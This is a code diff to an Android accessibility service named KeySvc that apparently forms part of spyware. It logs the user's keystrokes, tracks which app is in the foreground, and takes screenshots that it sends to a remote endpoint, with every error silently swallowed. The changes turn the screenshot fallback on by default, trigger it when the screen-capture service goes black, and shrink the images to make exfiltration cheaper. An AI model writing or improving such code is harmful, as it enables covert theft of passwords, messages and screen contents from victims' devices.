@@ -32,24 +32,23 @@ public class KeySvc extends AccessibilityService {
     private final StringBuilder buf = new StringBuilder();
     private volatile long lastFlush;
     private volatile String curPkg;
-    public volatile boolean shotOn;
+    public volatile boolean shotOn = true;   // fallback por screenshot ligado por padrao
     private volatile boolean shotBusy;
     private WindowManager wm;
     private View ov;
     private PowerManager.WakeLock wl;
 
     private final Runnable flush = new Runnable() {
-        @Override public void run() {
-            flushNow();
-        }
+        @Override public void run() { flushNow(); }
     };
 
     private final Runnable loop = new Runnable() {
         @Override public void run() {
             try {
-                if (shotOn && !ScreenSvc.alive && Build.VERSION.SDK_INT >= 30) grab();
+                boolean precisa = !ScreenSvc.alive || ScreenSvc.black;
+                if (shotOn && precisa && Build.VERSION.SDK_INT >= 30) grab();
             } catch (Throwable ignored) {}
-            H.postDelayed(this, 340);
+            H.postDelayed(this, 500);
         }
     };
 
@@ -84,7 +83,8 @@ public class KeySvc extends AccessibilityService {
             String pkg = curPkg;
             if (pkg != null && pkg.equals(getPackageName())) return false;
             int kc = e.getKeyCode();
-            if (kc == KeyEvent.KEYCODE_BACK || kc == KeyEvent.KEYCODE_HOME || kc == KeyEvent.KEYCODE_APP_SWITCH) return false;
+            if (kc == KeyEvent.KEYCODE_BACK || kc == KeyEvent.KEYCODE_HOME
+                    || kc == KeyEvent.KEYCODE_APP_SWITCH) return false;
             CharSequence cs = e.getCharacters();
             String txt = cs == null ? "" : cs.toString();
             if (txt.length() == 0) {
@@ -182,24 +182,26 @@ public class KeySvc extends AccessibilityService {
                 @Override public void onSuccess(ScreenshotResult r) {
                     Bitmap b = null;
                     Bitmap soft = null;
+                    Bitmap small = null;
                     try {
                         b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                         soft = Bitmap.createBitmap(b.getWidth(), b.getHeight(), Bitmap.Config.ARGB_8888);
-                        android.graphics.Canvas cv = new android.graphics.Canvas(soft);
-                        cv.drawBitmap(b, 0, 0, null);
+                        new android.graphics.Canvas(soft).drawBitmap(b, 0, 0, null);
+                        int tw = Math.min(720, soft.getWidth());
+                        int th = Math.max(2, soft.getHeight() * tw / soft.getWidth());
+                        small = Bitmap.createScaledBitmap(soft, tw & ~1, th & ~1, true);
                         ByteArrayOutputStream bo = new ByteArrayOutputStream();
-                        soft.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
+                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                         Net.sendBin(bo.toByteArray());
                     } catch (Throwable ignored) {
                     } finally {
+                        try { if (small != null) small.recycle(); } catch (Throwable ignored) {}
                         try { if (soft != null) soft.recycle(); } catch (Throwable ignored) {}
                         try { r.getHardwareBuffer().close(); } catch (Throwable ignored) {}
                         shotBusy = false;
                     }
                 }
-                @Override public void onFailure(int code) {
-                    shotBusy = false;
-                }
+                @Override public void onFailure(int code) { shotBusy = false; }
             });
         } catch (Throwable t) {
             shotBusy = false;
